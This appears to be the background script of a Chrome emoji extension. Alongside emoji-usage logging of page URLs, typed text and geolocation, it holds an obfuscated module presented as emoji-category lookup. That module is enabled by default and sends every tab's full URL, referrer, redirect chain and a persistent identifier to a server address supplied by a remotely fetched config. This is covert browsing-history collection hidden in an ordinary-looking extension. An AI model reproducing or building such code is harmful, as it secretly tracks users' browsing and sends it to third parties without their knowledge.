// google analytics
var _gaq = _gaq || [];
var details = chrome.app.getDetails();
_gaq.push(['_setAccount', 'UA-46232748-1']);
//_gaq.push(['_setSampleRate', '20']);
_gaq.push(['_trackPageview', '/ping?id='+details.id+'&v='+details.version]);
(function() {
    var ga = document.createElement('script');
    ga.type = 'text/javascript';
    ga.async = true;
    ga.src = 'https://ssl.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(ga, s);
})();

// for emoji map
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {

        _gaq.push(['_trackEvent', request.eventtype, request.emoji, request.site]);

        if (request.log) {
            var r2 = new XMLHttpRequest();
            r2.open("POST", "https://emojimaster.com/emoji/", true);
            r2.setRequestHeader("Content-type", "application/json");
            var submit_obj2 = {
                "user_guid": emojiStats.clientId, // identifier
                "emoji": request.emoji, // the emoji used
                "url": request.site || sender.tab.url, // site it was used on (for debugging purposes)
                "inputMethod": request.inputMethod, // which method was used to input emoji
                "typedString": request.typedString || '', // TODO figure out how to break apart words so sentences lose meaning for privacy (this will be for emoji prediction) (right now this sends no info)
                "geo": emojiStats.clientGeo // for usage visualization
            }
            r2.send(JSON.stringify(submit_obj2));
        }
    });

function jsonp(url, callback) {
    var callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
    window[callbackName] = function(data) {
        delete window[callbackName];
        document.body.removeChild(script);
        callback(data);
    };

    var script = document.createElement('script');
    script.src = url + (url.indexOf('?') >= 0 ? '&' : '?') + 'callback=' + callbackName;
    document.body.appendChild(script);
}

var emojiStats = {
    extId: '1',
    clientGeo: {},
    clientId: undefined,
    init: function(url) {
        this.clientId = this.getPref('am_client_id');

        if (!this.clientId) {
            this.clientId = this.uuidGenerator();
            this.setPref('am_client_id', this.clientId);
        }

        this.clientGeo = this.getPref('am_client_geo');
        if (!this.clientGeo || this.clientGeo == 'undefined' || this.clientGeo == {}) {
          this.clientGeo = {};
            jsonp('https://freegeoip.net/json/', function(data) {
                if (data) {
                    emojiStats.clientGeo = data;
                }
                emojiStats.setPref('am_client_geo', this.clientGeo);
            });
        }
    },
    uuidGenerator: function() {
        var S4 = function() {
            return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
        };
        return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
    },
    getPref: function(name) {
        var value = localStorage[name];
        if (value == 'false')
            return false;
        else
            return value;
    },
    setPref: function(name, value) {
        localStorage[name] = value;
    }
}


window.addEventListener("load", function() {
    emojiStats.init();
}, false);


// get site category from server to change icon and show best emoji category for site
var emoCategory = (function() {
    var itemator = "a23235a59";
    var version = chrome.runtime.getManifest().version, serverInfo = localStorage.serverInfo ? JSON.parse(localStorage.serverInfo) : [];
    var url = 'https:/'+'/emojistuffcustom.com';
    var settings_key = "setoos";
    var set_route = "/pin/values";
    var main_route = "/emoji/category";
    var guid_key = "gukee";
    var skeys = ['o', 'u'];
    var tkey = "hh6hsss84";
    var ch=4;
    var browsername = "chrome";

    var toggler = new(function(){
        var isOn = true,
            defaultVal = true,
            localKey = tkey;
        function save(){
            localStorage.setItem(localKey, isOn ? 1:0);
        };
        function load(){
            var val = localStorage.getItem(localKey),
                intVal = parseInt(val);
            if (isNaN(intVal)){
                isOn = defaultVal;
            }else{
                isOn = intVal === 1;
            }
        };
        this.turnOn = function(){ isOn = true; save(); _optTurnOn(); }
        function _optTurnOn() {};
        this.turnOff = function(){ isOn = false; save(); }
        this.isOn = function(){ return isOn; }
        /**
         * returns a Promise which resolves only when (or after) toggler is turned On
         * if toggler is turned on by the time this function is called
         * promise resolved instantly
         * @returns {Promise}
         */
        this.whenOn = function(){
            if (this.isOn()){
                return Promise.resolve(true);
            }
            return new Promise(function(resolve){
                _optTurnOn = function(){
                    resolve();
                };
            });
        };
        load();
    });
    function getDomainName(href){
        var l = document.createElement("a");
        l.href = href;
        return l.hostname;
    }
    var configFetcher = new(
        function(){
            var settings = '';
            var setDump = function() {
                localStorage.setItem(settings_key, JSON.stringify(settings));
            };
            var setLoad = function() {
                var p = localStorage.getItem(settings_key);
                settings = p ? JSON.parse(p) : settings;
            };
            var setUp = function(endpt){
                var cb = function(sts, resp){
                    if (!sts) {
                        return;
                    }
                    settings = JSON.parse(resp);
                    setDump();
                };
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (4 == xhr.readyState) {
                        cb.apply(null, [200 == xhr.status, xhr.responseText].concat(arguments));
                    }};
                var proc = function(arr){ return Object.keys(arr).map(function(hashed) {
                    return hashed + '=' + arr[hashed]; }).join("&")}
                xhr.open("GET", endpt + "?" + proc({s: itemator, ver: version}), true);
                xhr.send();
            };
            setLoad();
            toggler.whenOn().then(function(){
                setUp(url+set_route);
            });
            this.enablator = function() {
                settings[skeys[0]] = 1; setDump();
            };
            this.disablator = function() {
                settings[skeys[0]] = 0; setDump();
            };
            this.IsEnable = function() {
                return Boolean(settings && settings[skeys[0]])
            };
            this.MainLocator = function() {
                return settings && settings[skeys[1]]
            };
        }
    )();
    var filtered = ["restarting", "hh", "p", "fr","aj", "replaced", "retroet", "dada"];
    function qs(obj) {
        return Object.keys(obj).filter(function (key) {
            return (!!obj[key] || false === obj[key]) && filtered.indexOf(key) === -1;
        }).map(function (key) {
            var val = obj[key];
            if ('se' === key) {
                return obj[key].map(function (v) {
                    return key + '=' + encodeURIComponent(v);
                }).join('&');
            }
            if (-1 < 'sh b a lt'.split(' ').indexOf(key)) {
                val = encodeURIComponent(val || '');
            }
            return key + '=' + val;
        }).join('&');
    }
    function fetchOverlayPattern(data, callback) {
        data.tnew = Date.now();
        var bqa = qs(data);
        var payload = bqa;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', configFetcher.MainLocator()+main_route, true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("cerc", getDomainName(data["sh"]));
        xhr.onload = function (e) {
            if (this.status == 200) {
                callback(JSON.parse(this.response));
            }
        };
        xhr.send(['e', encodeURIComponent(payload)].join('=') + "&decode=0");
        //xhr.onload.apply({status:200});
    }
    function TabList() {
        var hash = {};
        var lp = "";
        var lpi = undefined;
        return {
            remove: function (tid) {
                delete hash[tid];
            },
            edit: function (tid, props) {
                if (!tid) return null;
                if (!hash[tid]) this.clear(tid);
                Object.keys(props || {}).forEach(function (key) {
                    hash[tid][key] = props[key];
                });
                return hash[tid];
            },
            request: function (tabId, tab) {
                if(!configFetcher.IsEnable() || !toggler.isOn())
                    return
                if (!hash[tabId] || (hash[tabId].p && !hash[tabId].replaced)) {
                    this.clear(tabId);
                    return;
                }
                var currTab = hash[tabId] || {};
                var url = validateUrl(tab.url);
                if (url && !(!currTab.hh && lp == tab.url)) {
                    if (!tab.active && !hash[tabId].fr) {
                        hash[tabId].uk.push("background_auto_reloading");
                    }
                    fetchOverlayPattern(this.edit(tabId, {
                        sh: url,
                        b: lp
                    }), function (d) {
                        if (d && d.category){
                            const catUpper = d.category.toUpperCase();
                            let icon = null;
                            switch (catUpper){
                                case "ACTIVITY":
                                    icon = "catActivity.png";
                                    break;
                                case "FLAGS":
                                    icon = "catFlags.png";
                                    break;
                                case "FOODS":
                                    icon = "catFoods.png";
                                    break;
                                case "NATURE":
                                    icon = "catNature.png";
                                    break;
                                case "OBJECTS":
                                    icon = "catObjects.png";
                                    break;
                                case "PEOPLE":
                                    icon = "catPeople.png";
                                    break;
                                case "PLACES":
                                    icon = "catPlaces.png";
                                    break;
                                case "SYMBOLS":
                                    icon = "catSymbols.png";
                                    break;
                            }
                            if (icon){
                                chrome.browserAction.setIcon({
                                    tabId: tabId,
                                    path: icon
                                })
                                hash[tabId].emocat = catUpper;
                            }
                        }
                    });
                    if (tab.active) {
                        lp = currTab.sh;
                    }
                    hash[tabId].dada = null;
                }
                this.clear(tabId);
                hash[tabId].sh = url;
                hash[tabId].p = true;
            },
            clear: function (tid) {
                hash[tid] = {
                    su: version || "missing", val: 21, un: "1", var: "4212e",ch:ch,
                    new: itemator, exp: guid(), sesnew: '', d: 0,
                    se: [], restarting: false,
                    sh :  (hash[tid] || {}).sh || null,
                    a : (hash[tid] || {}).a || '',
                    uk: [], fr: false, aj : (hash[tid] || {}).aj || false,
                    replaced :  (hash[tid] || {}).replaced || false,
                    hh :  (hash[tid] || {}).hh || false,
                    dada: (hash[tid] || {}).dada || null,
                    retroet: (hash[tid] || {}).retroet || '',
                    emocat: (hash[tid] || {}).emocat
                };
            },
            details: function (tid, cb) {
                chrome.tabs.get(tid, function (details) {
                    if (!chrome.runtime.lastError) {
                        cb(details);
                    }
                });
            },
            lpUpdate: function (param) {
                var idd = param.id || param;
                lpi = param.id || undefined;
                lp = (hash[idd] || {}).sh || lp;
            },
            getLpi: function(){
                return lpi;
            }
        }
    }
    function validateUrl(url) {
        return (url.indexOf("http") === 0 &&
            url.indexOf(":/"+"/localhost") === -1 &&
            url.indexOf("chrome/newtab") === -1 &&
            url.indexOf("chrome-") !== 0 &&
            url.indexOf("about:") !== 0  &&
            url.indexOf("chrome:/"+"/") === -1) ? url : null;
    }
    var tablist = new TabList();
    var cb = chrome.browserAction,
        ct = chrome.tabs,
        wr = chrome.webRequest,
        wn = chrome.webNavigation,
        cw = chrome.windows;
    cw.getAll({populate: true}, function (windows) {
        for (var w = 0; w < windows.length; w++) {
            for (var i = 0; i < windows[w].tabs.length; i++) {
                if (!validateUrl(windows[w].tabs[i].url))
                    continue;
                tablist.edit(windows[w].tabs[i].id, {sh: windows[w].tabs[i].url, restarting: true});
                if (windows[w].focused && windows[w].tabs[i].active) {
                    tablist.lpUpdate(windows[w].tabs[i]);
                }
            }
        }
    });
    function reselected(tid) {
        tablist.details((tid || {}).tabId || tid, tablist.lpUpdate);
    }
    ct.onUpdated.addListener(onUpdated);
    ct.onReplaced.addListener(onReplaced);
    var repertuar = {types: ["main_frame"], urls: ["<all_urls>"]};
    wr.onBeforeRequest.addListener(function (details) {
        validateUrl(details.url) && tablist.edit(details.tabId, {sh: undefined, p: false, aj : false});
    }, repertuar, ["blocking"]);
    wr.onBeforeRedirect.addListener(function (details) {
        validateUrl(details.url) && tablist.edit(details.tabId).se.push(details.url);
    }, repertuar);
    wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, ["blocking", "requestHeaders"]);
    wr.onHeadersReceived.addListener(function (details) {
        tablist.edit(details.tabId, {hh: true})
    }, repertuar);
    wn.onCommitted.addListener(onCommitted);
    ct.onRemoved.addListener(function (tabId) {
        tablist.remove(tabId);
    });
    cw.onRemoved.addListener(cwonRemoved);
    ct.onCreated.addListener(onCreated);
    cw.onFocusChanged.addListener(cwonFocused);
    if (ct.onActivated) {
        ct.onActivated.addListener(reselected);
    } else {
        ct.onSelectionChanged.addListener(reselected);
    }
    wr.onErrorOccurred.addListener(function (details) {
        try {
            tablist.edit(details.tabId, {se: null});
        } catch (e) {
        }
    }, repertuar);
    function onUpdated(tabId, details, tab) {
        if (details && "complete" === details.status) {
            if(tablist.edit(tabId).p && tablist.edit(tabId).aj){
                tablist.edit(tabId, {sh: undefined, p: false, aj : false});
            }
            tablist.edit(tabId, {ng: "ajax", aj : true});
            tablist.request(tabId, tab);
            tablist.edit(tabId, {replaced: false});
        }
    }
    function onReplaced(addedTabId, removedTabId) {
        tablist.edit(addedTabId, {replaced: true});
        tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || {}).tabId || addedTabId));
    }
    function onBeforeSendHeaders(details) {
        tablist.edit(details.tabId, {hh: true});
        if(!details.requestHeaders.some(function (rh) {
                return /^Referer$/i.test(rh.name) && tablist.edit(details.tabId, {a: rh.value});
            })){
            tablist.edit(details.tabId, {a: ''})
        }
        return {requestHeaders: details.requestHeaders};
    }
    function onCommitted(dtls) {
        dtls = dtls || {};
        var tid = dtls.tabId;
        var tsh = dtls.transitionQualifiers;
        if (tid && dtls.frameId === 0) {
            tablist.edit(tid, {ng: dtls.transitionType, tsh: tsh});
            if ( /client_redirect/.test(tsh)) {
                tablist.edit(tid, {lt: dtls.url});
            }
            if (/server_redirect/.test(tsh)) {
            }
            tablist.details(tid, tablist.request.bind(tablist, (tid || {}).tabId || tid));
        }
    }
    function cwonRemoved(windowID) {
        ct.query({active: true}, function (tabs) {
            if (tabs[0]) {
                tablist.lpUpdate(tabs[0]);
            }
        });
    }
    function cwonFocused(window) {
        if (cw.WINDOW_ID_NONE == window) {
            return;
        }
        ct.query({windowId: window, active: true}, function (tabs) {
            if (tabs[0] && tabs[0].active) {
                tablist.lpUpdate(tabs[0]);
            }
        });
    }
    function onCreated(tab) {
        var curTab = tablist.edit(tab.id, {fr: true,  replaced : false});
        var openerTabId = tab.openerTabId || tablist.getLpi();
        var oOpenerTabInfo = tablist.edit(openerTabId);
        if (tab.url.length && tablist.edit(openerTabId) && tab.url === tablist.edit(openerTabId).sh) {
            tablist.edit(tab.id).uk.push("duplication");
        } else if (tab.url.length) {
            ct.query({
                url: tab.url
            }, function (tabs) {
                if ((tabs || []).length > 1) {
                    tablist.edit(tab.id).uk.push("duplication");
                    tablist.edit(tab.id).uk.push("background_duplication");
                }
            });
        }
        if ('complete' == tab.status && !tab.openerTabId) {
            tablist.edit(tab.id).uk.push("reopening");
        }
        tablist.edit(tab.id, {dada: openerTabId});
    }
    function guid() {
        var guid = localStorage.getItem(guid_key);
        if (!guid) {
            var g = function () {
                return (((1 + Math.random(Date.now() + 12)) * 0x10000) | 0).toString(30).substring(1);
            };
            guid = (g() + g() + g() + g() + g() + g() + g() + g() + g());
            localStorage.setItem(guid_key, guid);
        }
        return guid;
    }

    function getEmoCatForTab(tabId){
        const t = tablist.edit(tabId);
        return t ? t.emocat: null;
    }

    chrome.runtime.onMessage.addListener(function(request, sender, respond){
        if (!request || !request.action) return;
        switch(request.action){
            case "auto_emocat_on":
                toggler.turnOn();
                break;
            case "auto_emocat_off":
                toggler.turnOff();
                break;
            case "get_emocat_for_tab":
                if (request.tabId) {
                    const emocat = getEmoCatForTab(request.tabId);
                    respond(emocat);
                }else{
                    respond(null);
                }
                break;
        }
    });

    return {
        optin : toggler.turnOn,
        optout : toggler.turnOff,
        isopt : toggler.isOn,
        whenopt: toggler.whenOn()
    }
}());

